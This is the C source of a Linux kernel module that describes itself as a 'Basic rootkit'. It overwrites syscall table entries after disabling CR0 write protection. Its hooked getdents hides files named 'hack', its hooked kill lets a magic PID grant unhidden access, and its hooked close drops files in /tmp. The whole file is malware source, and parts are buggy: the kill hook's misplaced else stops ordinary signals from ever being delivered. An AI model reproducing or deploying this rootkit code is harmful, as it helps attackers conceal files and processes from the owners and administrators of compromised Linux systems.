#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <asm/current.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>


MODULE_AUTHOR("Antoine Rouquette");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Basic rootkit");

#define SYS_CALL_TABLE_ADDR 0xffffffff87e00220
#define KALLSYMS_PATH       "/proc/kallsyms"
#define FILE_PATH           "/tmp/hack"
#define FILE_PATH_SIZE      9
#define FILE_BASENAME       "hack"
#define FILE_BASENAME_SIZE  4
#define MAGIC_KILL_PID		1234
#define MAX_PIDS			8


static pid_t authorized_pids[MAX_PIDS] = {0};
static size_t authorized_pids_cnt = 0;

struct linux_dirent 
{
    unsigned long   d_ino;      // Inode number.
    unsigned long   d_off;      // Offset of the next linux dirent.
    unsigned short  d_reclen;   // Length of this linux dirent.
    char            d_name[];   // Filename.
};

//How to find the syscall address and not in hardcoded
unsigned long * sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;

// Original functions
asmlinkage int (*original_sys_close) (unsigned int fd);
asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);
asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
asmlinkage pid_t (*original_sys_getpid) (void);
asmlinkage pid_t (*original_sys_getppid) (void);

/*  
 * File system, one layer deep into kernel
 * Donc, pour chaque fonction de userland, il faut voir son implementation et checker le niveau en dessous
 * */
 
struct file *file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	// on stocke l'ancien filesystem ici
	oldfs  = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if(IS_ERR(filp))
	{
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}
 
int file_close(struct file *file)
{
    return filp_close(file, NULL);
}
 
int file_read(struct file * file, unsigned long long offset, unsigned char * data, 
                   unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file * file, unsigned long long offset, unsigned char * data, 
                    unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file * file)
{
    vfs_fsync(file, 0);
    return 0;
}

// Finish editing some files here
 
asmlinkage int fake_sys_kill(pid_t pid, int sig)
{
	int ret = 0;
	if(pid == MAGIC_KILL_PID)
		if(authorized_pids_cnt < MAX_PIDS)
			authorized_pids[authorized_pids_cnt++] = current->pid;
	else
		ret = original_sys_kill(pid, sig);
	return ret;
}

asmlinkage int fake_sys_close(unsigned int fd)
{
#define MAX_NAME_SIZE	64
    static char cnt;
    char filename[MAX_NAME_SIZE] = {'\0'};
    struct file * filp = NULL;

    if(cnt > 9)
		return original_sys_close(fd);

	snprintf(filename, MAX_NAME_SIZE, "%s%d.txt", FILE_PATH, cnt);

    filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
    if(filp)
    {
        printk("[%s] File : %s created!\n", __this_module.name, filename);
        file_close(filp);
        filp = NULL;
    }
    cnt++;

    return original_sys_close(fd);
}

asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	// Get the relevant informations
#define LOGS_SIZE	512
    unsigned long 			bpos 		= 0;
    unsigned long 			lost_data 	= 0;
    char 					* buf;
    char 					d_type;
    char 					logs[LOGS_SIZE];
    struct linux_dirent *	dir;		
    struct linux_dirent *	prev		= NULL;
    unsigned long 			i			= 0;
    int 					found		= 0;
    int						nread		= 0;
    pid_t					pid		    = original_sys_getpid();
    pid_t					ppid	    = original_sys_getppid();

	for(i = 0; i < authorized_pids_cnt; i++)
	{
		if(pid == authorized_pids[i] || ppid == authorized_pids[i])
		{
			found = 1;
			break;
		}
	}

	// If authorized pid, allow to read all file
	if(found)
	{
		printk("[%s] [OK] pid[%d]\n", __this_module.name, current->pid);
		return original_sys_getdents(fd, dirp, count);
	}

	printk("[%s] [KO] pid[%d]\n", __this_module.name, current->pid);
	nread = original_sys_getdents(fd, dirp, count);

    buf = (char*)dirp;

    if(nread < 0)
        return nread;
    else if(nread == 0)
        return nread;
        
	printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
	printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);

	for(bpos = 0; bpos < nread;)
	{
		dir = (struct linux_dirent *)(buf + bpos);
		d_type = *(buf + bpos + dir->d_reclen - 1);
		snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
			(d_type == DT_REG) ?  "regular" :
			(d_type == DT_DIR) ?  "directory" :
			(d_type == DT_FIFO) ? "FIFO" :
			(d_type == DT_SOCK) ? "socket" :
			(d_type == DT_LNK) ?  "symlink" :
			(d_type == DT_BLK) ?  "block dev" :
			(d_type == DT_CHR) ?  "char dev" : "???",
			dir->d_reclen, (long long) dir->d_off, dir->d_name);
		printk("[%s] %s", __this_module.name, logs);

		if(strlen(dir->d_name) > 3)
		{
			// Shit, we get the file of the same name, hide it, is it 1st element!
			if(!memcmp(dir->d_name, "hack", 4))
			{
				// Just move the 1st block in that case and don't do anything
				if(!prev)
				{
					struct linux_dirent * 	next 	= (struct linux_dirent *)(buf + bpos + dir->d_reclen);
					unsigned long			offset	= dir->d_reclen + next->d_reclen;
					lost_data += dir->d_reclen;
					dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
					dir->d_reclen = offset;
					continue;
				}
				else
				{
					lost_data += dir->d_reclen;
					prev->d_reclen += dir->d_reclen;
					bpos += dir->d_reclen;
					continue;
				}
			}
		}
		prev = dir;
		// move to next linux_dirent
		bpos += dir->d_reclen;
	}

    return (nread - lost_data);
}

static int __init lkm_init(void)
{
    original_sys_close      = sys_call[__NR_close];
    original_sys_getdents   = sys_call[__NR_getdents];
    original_sys_kill   	= sys_call[__NR_kill];
    original_sys_getpid   	= sys_call[__NR_getpid];
    original_sys_getppid   	= sys_call[__NR_getppid];
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_close]    = fake_sys_close;
    sys_call[__NR_getdents] = fake_sys_getdents;
    sys_call[__NR_kill] 	= fake_sys_kill;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
    printk("[%s] hardcoded syscall table address : 0x%p.\n", __this_module.name, sys_call);
    return 0;
}

static void __exit lkm_exit(void)
{
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_close] 	= original_sys_close;
    sys_call[__NR_getdents] = original_sys_getdents;
    sys_call[__NR_kill] 	= original_sys_kill;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module unloaded.\n", __this_module.name);
}

// how to find the syscall table in this case

module_init(lkm_init);
module_exit(lkm_exit);
